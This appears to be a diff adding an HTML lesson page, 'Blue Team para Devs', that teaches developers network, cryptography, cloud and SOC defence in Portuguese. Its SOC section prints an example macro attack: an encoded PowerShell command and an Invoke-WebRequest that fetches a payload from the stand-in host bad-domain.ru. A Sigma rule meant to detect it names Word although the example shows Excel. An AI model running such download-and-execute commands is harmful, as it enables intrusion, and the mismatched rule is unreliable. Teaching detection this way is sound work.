+<span class="cm"># atacante usa:</span>
+<span class="er">evil-d0main.ru</span>  → C2
+<span class="er">g00gle.com</span>      → phishing
+<span class="er">update-win.net</span>  → malware
+      </div>
+    </div>
+  </div>
+
+  <div class="sep"></div>
+
+  <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">TCP THREE-WAY HANDSHAKE</p>
+
+  <div class="tcp-diagram">
+    <div style="display:flex;justify-content:space-between;margin-bottom:1rem">
+      <div style="font-family:var(--mono);font-size:11px;padding:6px 14px;background:var(--bg3);border:1px solid var(--border2);border-radius:6px;color:var(--blue)">Cliente</div>
+      <div style="font-family:var(--mono);font-size:11px;padding:6px 14px;background:var(--bg3);border:1px solid var(--border2);border-radius:6px;color:var(--teal)">Servidor</div>
+    </div>
+
+    <!-- SYN -->
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px">
+      <div style="width:30px;height:1px"></div>
+      <div style="flex:1;height:2px;background:linear-gradient(90deg,var(--blue),transparent 80%);position:relative">
+        <span style="position:absolute;top:-20px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:11px;color:var(--blue);white-space:nowrap">SYN</span>
+        <span style="position:absolute;right:-1px;top:-5px;border:5px solid transparent;border-left:7px solid var(--border2)"></span>
+      </div>
+    </div>
+
+    <!-- SYN-ACK -->
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px">
+      <div style="width:30px;height:1px"></div>
+      <div style="flex:1;height:2px;background:linear-gradient(270deg,var(--teal),transparent 80%);position:relative">
+        <span style="position:absolute;top:-20px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:11px;color:var(--teal);white-space:nowrap">SYN-ACK</span>
+        <span style="position:absolute;left:-1px;top:-5px;border:5px solid transparent;border-right:7px solid var(--border2)"></span>
+      </div>
+    </div>
+
+    <!-- ACK -->
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+      <div style="width:30px;height:1px"></div>
+      <div style="flex:1;height:2px;background:linear-gradient(90deg,var(--green),transparent 80%);position:relative">
+        <span style="position:absolute;top:-20px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:11px;color:var(--green);white-space:nowrap">ACK ✓ conexão estabelecida</span>
+        <span style="position:absolute;right:-1px;top:-5px;border:5px solid transparent;border-left:7px solid var(--border2)"></span>
+      </div>
+    </div>
+
+    <div class="sep"></div>
+
+    <div class="grid-2">
+      <div style="background:var(--red-dim);border:1px solid rgba(239,68,68,.25);border-radius:8px;padding:.75rem">
+        <p style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:4px;letter-spacing:.08em">ALERTA</p>
+        <p style="font-size:12px;color:var(--text)">Muitos <strong>SYN sem ACK</strong> = port scan ou SYN flood (DDoS)</p>
+      </div>
+      <div style="background:var(--amber-dim);border:1px solid rgba(245,158,11,.25);border-radius:8px;padding:.75rem">
+        <p style="font-family:var(--mono);font-size:10px;color:var(--amber);margin-bottom:4px;letter-spacing:.08em">BEACONING</p>
+        <p style="font-size:12px;color:var(--text)">Conexão de saída a cada <strong>60s exatos</strong> = malware se comunicando com C2</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="insight">
+    Tráfego estranho = sinal de ataque. Padrão repetitivo = malware. Isso é o que o <strong>SIEM</strong> detecta automaticamente correlacionando logs de rede.
+  </div>
+</div>
+
+<!-- ═══════════ 3 — CRYPTO ═══════════ -->
+<div class="section" id="s3">
+  <div class="section-header">
+    <div class="section-num">03</div>
+    <div class="section-meta">
+      <h2>Criptografia — sem viagem matemática</h2>
+      <p class="desc">Hash, senhas com salt+custo e TLS. Três conceitos que todo dev precisa entender de verdade — não só saber o nome.</p>
+    </div>
+  </div>
+
+  <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">1. HASH — FUNÇÃO IRREVERSÍVEL</p>
+
+  <div style="margin-bottom:.75rem">
+    <div class="hash-demo" id="hashDemo">
+      <input type="text" id="hashInput" placeholder="digite qualquer coisa..." oninput="computeHash()" value="minhaSenha123">
+      <div class="hash-result" id="hashOutput">—</div>
+    </div>
+    <p style="font-size:11px;color:var(--dim);margin-top:6px;font-family:var(--mono)">↑ SHA-256 em tempo real — mesma entrada sempre gera o mesmo hash · irreversível</p>
+  </div>
+
+  <div class="code-block" style="margin-bottom:1rem">
+<span class="code-tag">uso</span>
+<span class="cm"># integridade de arquivo</span>
+sha256sum firmware.bin → <span class="st">a3f9...</span>  <span class="cm">← verifica se foi alterado</span>
+
+<span class="cm"># token de sessão</span>
+sessionToken = sha256(userId + timestamp + secret)
+
+<span class="cm"># MD5 e SHA-1 → QUEBRADOS (não usar para segurança)</span>
+  </div>
+
+  <div class="sep"></div>
+
+  <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">2. SENHA SEGURA — SALT + CUSTO</p>
+
+  <div class="grid-2" style="margin-bottom:1rem">
+    <div class="code-block" style="border-color:rgba(239,68,68,.3)">
+<span class="code-tag er">ERRADO</span>
+<span class="cm"># armazenar só o hash</span>
+db.save(<span class="er">sha256(senha)</span>)
+
+<span class="cm"># problema:</span>
+<span class="er">rainbow table</span> → ataque offline
+mesmo hash para senhas iguais
+    </div>
+    <div class="code-block" style="border-color:rgba(34,197,94,.25)">
+<span class="code-tag ok">CORRETO</span>
+<span class="cm"># bcrypt / argon2</span>
+db.save(<span class="ok">bcrypt(senha, saltRounds=12)</span>)
+
+<span class="cm"># bcrypt:</span>
+<span class="ok">+ salt</span> aleatório por senha
+<span class="ok">+ custo</span> configurável (lento = bom)
+<span class="ok">+ resistente</span> a GPU/brute-force
+    </div>
+  </div>
+
+  <div class="insight">
+    "MD5 quebrado" não é sobre o algoritmo ser mágico — é sobre o <strong>custo de ataque</strong>. Hoje uma GPU testa bilhões de MD5/segundo. Bcrypt/Argon2 são lentos por design.
+  </div>
+
+  <div class="sep"></div>
+
+  <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">3. TLS (HTTPS) — O QUE PROTEGE E O QUE NÃO PROTEGE</p>
+
+  <div class="grid-3">
+    <div class="card teal">
+      <div class="card-label">Protegido pelo TLS</div>
+      <h3 style="color:var(--teal)">Conteúdo 🔒</h3>
+      <p>Payload da requisição, body, headers, cookies — criptografados de ponta a ponta.</p>
+    </div>
+    <div class="card amber">
+      <div class="card-label">Visível mesmo com TLS</div>
+      <h3 style="color:var(--amber)">Domínio (SNI) ⚠</h3>
+      <p>Durante o handshake, o hostname vai em claro — dá pra ver que você acessou evil.com.</p>
+    </div>
+    <div class="card amber">
+      <div class="card-label">Visível mesmo com TLS</div>
+      <h3 style="color:var(--amber)">Padrão de tráfego ⚠</h3>
+      <p>Volume, frequência e tamanho dos pacotes — suficiente pra identificar beaconing de malware.</p>
+    </div>
+  </div>
+
+  <div class="insight">
+    "Criptografia protege o <strong>conteúdo</strong>, não o <strong>comportamento</strong>." — isso é o que torna a análise de tráfego (NetFlow, Zeek) essencial no SOC mesmo com HTTPS.
+  </div>
+</div>
+
+<!-- ═══════════ 4 — CLOUD ═══════════ -->
+<div class="section" id="s4">
+  <div class="section-header">
+    <div class="section-num">04</div>
+    <div class="section-meta">
+      <h2>Cloud & Arquitetura Moderna</h2>
+      <p class="desc">Data center antigo virou cloud. A lógica de segmentação é a mesma — só que agora tudo é configuração, e configuração errada vaza tudo.</p>
+    </div>
+  </div>
+
+  <div class="grid-2" style="margin-bottom:1rem;align-items:start">
+    <div>
+      <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">ANTES → CLOUD</p>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:12px;overflow:hidden">
+        <table class="soc-table">
+          <thead><tr><th>Antes</th><th>Cloud</th></tr></thead>
+          <tbody>
+            <tr><td style="color:var(--muted);font-family:var(--mono);font-size:12px">Firewall físico</td><td style="color:var(--teal);font-family:var(--mono);font-size:12px">Security Group</td></tr>
+            <tr><td style="color:var(--muted);font-family:var(--mono);font-size:12px">Rede interna</td><td style="color:var(--blue);font-family:var(--mono);font-size:12px">VPC</td></tr>
+            <tr><td style="color:var(--muted);font-family:var(--mono);font-size:12px">VLAN</td><td style="color:var(--purple);font-family:var(--mono);font-size:12px">Subnet</td></tr>
+            <tr><td style="color:var(--muted);font-family:var(--mono);font-size:12px">Servidor</td><td style="color:var(--amber);font-family:var(--mono);font-size:12px">EC2 / Container</td></tr>
+            <tr><td style="color:var(--muted);font-family:var(--mono);font-size:12px">Log de auditoria</td><td style="color:var(--coral);font-family:var(--mono);font-size:12px">CloudTrail</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div>
+      <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">ARQUITETURA VPC</p>
+      <div class="cloud-diagram">
+        <div class="vpc">
+          <div class="vpc-label">VPC — rede isolada</div>
+          <div class="subnet-row">
+            <div class="subnet pub">
+              <div class="subnet-label">Subnet pública</div>
+              <div class="sg-box">EC2 (Load Balancer)<span class="sg-ok">:443 ✓</span></div>
+              <div class="sg-box">EC2 (API)<span class="sg-ok">:443 ✓</span></div>
+            </div>
+            <div class="subnet priv">
+              <div class="subnet-label">Subnet privada</div>
+              <div class="sg-box">RDS (banco)<span class="sg-ok">:5432 só da API</span></div>
+              <div class="sg-box danger">EC2 mal config.<span class="sg-bad">:22 0.0.0.0 ✗</span></div>
+            </div>
+          </div>
+        </div>
+        <p style="font-size:11px;color:var(--muted);font-family:var(--mono)">CloudTrail + VPC Flow Logs → alimentam o SIEM</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="insight">
+    "99% dos problemas de segurança em cloud são de <strong>configuração</strong>." — porta 22 aberta pro mundo (0.0.0.0/0) é suficiente pra comprometer todo o ambiente.
+  </div>
+
+  <div class="sep"></div>
+
+  <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">ERROS CLÁSSICOS — CLOUD</p>
+
+  <div class="grid-3">
+    <div class="card red">
+      <div class="card-label">Erro #1</div>
+      <h3 style="color:var(--red)">Porta 22 aberta</h3>
+      <p>Security Group com <code style="font-family:var(--mono);font-size:11px">0.0.0.0/0</code> na porta 22. Bots escaneiam a internet em minutos.</p>
+    </div>
+    <div class="card red">
+      <div class="card-label">Erro #2</div>
+      <h3 style="color:var(--red)">Bucket S3 público</h3>
+      <p>Configuração padrão errada expõe dados sensíveis indexados pelo Google em horas.</p>
+    </div>
+    <div class="card amber">
+      <div class="card-label">Erro #3</div>
+      <h3 style="color:var(--amber)">IAM excessivo</h3>
+      <p>Role com AdministratorAccess para uma Lambda que só lê um S3 — princípio do mínimo privilégio.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════ 5 — SOC ═══════════ -->
+<div class="section" id="s5">
+  <div class="section-header">
+    <div class="section-num">05</div>
+    <div class="section-meta">
+      <h2>SOC — o coração do Blue Team</h2>
+      <p class="desc">Um sistema que observa tudo e reage. Conecta infra, rede e cripto em resposta orquestrada. É aqui que tudo se une.</p>
+    </div>
+  </div>
+
+  <div class="grid-2" style="margin-bottom:1.5rem;align-items:start">
+    <div>
+      <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">STACK DO SOC</p>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:12px;overflow:hidden">
+        <table class="soc-table">
+          <thead><tr><th>Ferramenta</th><th>Função</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>SIEM</td>
+              <td style="color:var(--muted);font-size:12px">Centraliza e correlaciona logs de toda a infra. Detecta padrões que sistemas isolados não veriam.</td>
+            </tr>
+            <tr>
+              <td>EDR</td>
+              <td style="color:var(--muted);font-size:12px">Monitora comportamento nos endpoints — processos, chamadas de sistema, rede por processo.</td>
+            </tr>
+            <tr>
+              <td>SOAR</td>
+              <td style="color:var(--muted);font-size:12px">Automatiza a resposta: isola host, bloqueia IP, abre ticket — sem intervenção manual.</td>
+            </tr>
+            <tr>
+              <td>Threat Intel</td>
+              <td style="color:var(--muted);font-size:12px">Feeds de IOCs: IPs maliciosos, hashes de malware, domínios C2 conhecidos.</td>
+            </tr>
+            <tr>
+              <td>UEBA</td>
+              <td style="color:var(--muted);font-size:12px">Detecta comportamento anômalo de usuários — login 3am, download de 50GB, acesso incomum.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div>
+      <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">FLUXO DO ALERTA</p>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:1.25rem">
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-label">Logs chegam ao SIEM</div>
+              <div class="step-desc">CloudTrail, Syslog, EDR, DNS, proxy, firewall — tudo centralizado</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-label">Correlação e regras</div>
+              <div class="step-desc">SIEM cruza eventos de múltiplas fontes — detecta o que nenhum sistema veria sozinho</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-label">Alerta gerado</div>
+              <div class="step-desc">Severidade classificada — crítico, alto, médio. SOAR recebe o trigger</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-label">Análise do analista</div>
+              <div class="step-desc">Falso positivo ou real? Qual o escopo? Outros hosts afetados?</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--red-dim);border-color:rgba(239,68,68,.3);color:var(--red)">5</div>
+            <div class="step-content">
+              <div class="step-label">Contenção & remediação</div>
+              <div class="step-desc">Isola host, revoga credencial, bloqueia domínio, corrige vuln. Lição aprendida.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sep"></div>
+
+  <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">CASO REAL — ATAQUE VIA MACRO OFFICE</p>
+
+  <div class="code-block" style="margin-bottom:1rem">
+<span class="code-tag">sequência detectada</span>
+<span class="cm"># 1. usuário abre Excel com anexo de phishing</span>
+EXCEL.EXE <span class="kw">iniciado</span> ← normal
+
+<span class="cm"># 2. Excel chama PowerShell (ANOMALIA)</span>
+EXCEL.EXE → <span class="er">powershell.exe -enc SGVsbG8gV29ybGQ=</span>
+
+<span class="cm"># 3. PowerShell baixa script externo</span>
+<span class="er">Invoke-WebRequest</span> https://bad-domain.ru/payload.ps1
+
+<span class="cm"># 4. malware conecta C2 a cada 60s (beaconing)</span>
+<span class="er">conexão de saída</span> → 185.220.xxx.xxx:443 <span class="cm">← C2</span>
+
+<span class="cm">─────────────────────────────────────────────</span>
+<span class="cm"># Regra SIGMA que detecta isso:</span>
+ParentImage: <span class="st">'*\WINWORD.EXE'</span>
+CommandLine|contains: <span class="st">'-enc'</span>
+<span class="cm"># IOA (Indicator of Attack) — comportamento</span>
+  </div>
+
+  <div class="sep"></div>
+
+  <p style="font-size:12px;color:var(--muted);font-family:var(--mono);letter-spacing:.08em;margin-bottom:.75rem">PYRAMID OF PAIN</p>
+
+  <div class="pyramid">
+    <div class="pyr-level">
+      <div class="pyr-pain hard">Difícil</div>
+      <div style="flex:1">
+        <div class="pyr-title">TTPs — Táticas, Técnicas e Procedimentos</div>
+        <div class="pyr-desc">Como o atacante age. Mudar exige reescrever o ataque inteiro. Detecte isso.</div>
+      </div>
+    </div>
+    <div class="pyr-level">
+      <div class="pyr-pain hard">Difícil</div>
+      <div style="flex:1">
+        <div class="pyr-title">Ferramentas usadas</div>
+        <div class="pyr-desc">Mimikatz, Cobalt Strike, BloodHound — podem trocar, mas custa tempo e dinheiro.</div>
+      </div>
+    </div>
+    <div class="pyr-level">
+      <div class="pyr-pain med">Médio</div>
+      <div style="flex:1">
+        <div class="pyr-title">Artefatos de rede & host</div>
+        <div class="pyr-desc">Strings específicas no malware, chaves de registro, mutexes — podem ser ofuscados.</div>
+      </div>
+    </div>
+    <div class="pyr-level">
+      <div class="pyr-pain easy">Fácil</div>
+      <div style="flex:1">
+        <div class="pyr-title">Domínio C2</div>
+        <div class="pyr-desc">Troca em minutos com um novo domínio. Bloquear domínio é whack-a-mole.</div>
+      </div>
+    </div>
+    <div class="pyr-level">
+      <div class="pyr-pain easy">Fácil</div>
+      <div style="flex:1">
+        <div class="pyr-title">Hash de arquivo · IP</div>
+        <div class="pyr-desc">Muda em segundos. Bloquear só isso não protege nada de verdade.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="insight">
+    Detecte <strong>comportamento</strong>, não coisa fixa. Um IP muda em 5 minutos. Um TTP muda em semanas. A Pyramid of Pain é o guia do que vale monitorar.
+  </div>
+</div>
+
+<!-- ═══════════ 6 — FECHAMENTO ═══════════ -->
+<div class="section" id="s6">
+  <div class="section-header">
+    <div class="section-num">06</div>
+    <div class="section-meta">
+      <h2>Fechamento — amarrando tudo</h2>
+      <p class="desc">Cada tema da aula se conecta a uma camada da defesa real. Segurança é uma cadeia — nenhum elo pode ser ignorado.</p>
+    </div>
+  </div>
+
+  <div class="closing-grid">
+    <div class="closing-card" onclick="showTab(1)" style="cursor:pointer">
+      <div class="icon" style="background:var(--blue-dim)">🏗️</div>
+      <h3>Infra</h3>
+      <p style="font-size:12px;color:var(--muted)"><strong style="color:var(--blue)">Onde o atacante entra.</strong> A superfície de ataque é definida na arquitetura — frontend, API, banco, cloud, CI/CD.</p>
+    </div>
+    <div class="closing-card" onclick="showTab(2)" style="cursor:pointer">
+      <div class="icon" style="background:var(--teal-dim)">🌐</div>
+      <h3>Redes</h3>
+      <p style="font-size:12px;color:var(--muted)"><strong style="color:var(--teal)">Como o atacante comunica.</strong> TCP, portas, DNS — entender isso é detectar o canal de C2 e o beaconing.</p>
+    </div>
+    <div class="closing-card" onclick="showTab(3)" style="cursor:pointer">
+      <div class="icon" style="background:var(--purple-dim)">🔐</div>
+      <h3>Criptografia</h3>
+      <p style="font-size:12px;color:var(--muted)"><strong style="color:var(--purple)">Protege os dados.</strong> Hash + salt + custo = senhas seguras. TLS protege conteúdo, não comportamento.</p>
+    </div>
+    <div class="closing-card" onclick="showTab(4)" style="cursor:pointer">
+      <div class="icon" style="background:var(--amber-dim)">☁️</div>
+      <h3>Cloud</h3>
+      <p style="font-size:12px;color:var(--muted)"><strong style="color:var(--amber)">Onde roda em produção.</strong> VPC, Security Group, IAM — 99% dos problemas são de configuração.</p>
+    </div>
+    <div class="closing-card" onclick="showTab(5)" style="cursor:pointer">
+      <div class="icon" style="background:var(--red-dim)">🎯</div>
+      <h3>SOC</h3>
+      <p style="font-size:12px;color:var(--muted)"><strong style="color:var(--red)">Detecta tudo.</strong> SIEM + EDR + SOAR + Threat Intel — a resposta orquestrada que amarra todas as camadas.</p>
+    </div>
+    <div class="closing-card">
+      <div class="icon" style="background:var(--teal-dim)">📖</div>
+      <h3>Próximos passos</h3>
+      <p style="font-size:12px;color:var(--muted)">TryHackMe (Blue Team Labs), MITRE ATT&CK, Sigma Rules, Elastic SIEM, Wazuh (open source SIEM+EDR)</p>
+    </div>
+  </div>
+
+  <div class="sep"></div>
+
+  <div class="summary-board">
+    <div class="summary-head">
+      <div class="summary-title">Blue Team para Devs - mapa da aula</div>
+      <div class="summary-sub">1h · 7 módulos</div>
+    </div>
+
+    <div class="summary-rows">
+      <div class="summary-row">
+        <div class="summary-key">Infra</div>
+        <div class="summary-value"><strong>Superfície de ataque nasce na arquitetura.</strong> Frontend, API, banco, cloud e CI/CD são portas de entrada.</div>
+      </div>
+      <div class="summary-row">
+        <div class="summary-key">Rede</div>
+        <div class="summary-value"><strong>TCP, portas e DNS mostram o comportamento.</strong> Beaconing e padrões repetitivos ajudam a detectar C2.</div>
+      </div>
+      <div class="summary-row">
+        <div class="summary-key">Cripto</div>
+        <div class="summary-value"><strong>Hash + salt + custo protegem senha.</strong> TLS protege o conteúdo do tráfego, mas não resolve tudo sozinho.</div>
+      </div>
+      <div class="summary-row">
+        <div class="summary-key">Cloud</div>
+        <div class="summary-value"><strong>Configuração errada vira incidente.</strong> VPC, Security Group e IAM definem o risco em produção.</div>
+      </div>
+      <div class="summary-row">
+        <div class="summary-key">SOC</div>
+        <div class="summary-value"><strong>Detecção precisa ser comportamental.</strong> Correlacionar sinais é melhor do que depender de IOC fixo.</div>
+      </div>
+    </div>
+
+    <div class="summary-quote">// Segurança não é ferramenta. É entender onde sistemas quebram.</div>
+  </div>
+</div>
+
+</main>
+
+<footer>
+  Blue Team para Devs · Roteiro de aula 1h · 7 módulos
+</footer>
+
+</div>
+
+<script>
+// ─── TAB NAVIGATION ───
+function showTab(idx) {
+  const sections = document.querySelectorAll('.section');
+  const btns = document.querySelectorAll('.tab-btn');
+  sections.forEach((s, i) => s.classList.toggle('active', i === idx));
+  btns.forEach((b, i) => b.classList.toggle('active', i === idx));
+  updateProgress(idx);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function updateProgress(idx) {
+  const pct = ((idx) / 6) * 100;
+  document.getElementById('progress').style.width = pct + '%';
+}
+
+// ─── SHA-256 HASH DEMO ───
+async function computeHash() {
+  const input = document.getElementById('hashInput').value;
+  const out = document.getElementById('hashOutput');
+  if (!input) { out.textContent = '—'; return; }
+  try {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(input));
+    const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+    out.textContent = hex;
+  } catch(e) {
+    out.textContent = 'erro ao computar';
+  }
+}
+
+// Initialize hash on load
+computeHash();
+
+// ─── KEYBOARD NAVIGATION ───
+document.addEventListener('keydown', e => {
+  const active = document.querySelector('.section.active');
+  const sections = [...document.querySelectorAll('.section')];
+  const idx = sections.indexOf(active);
+  if (e.key === 'ArrowRight' && idx < 6) showTab(idx + 1);
+  if (e.key === 'ArrowLeft' && idx > 0) showTab(idx - 1);
+});
+</script>
+</body>
+</html>
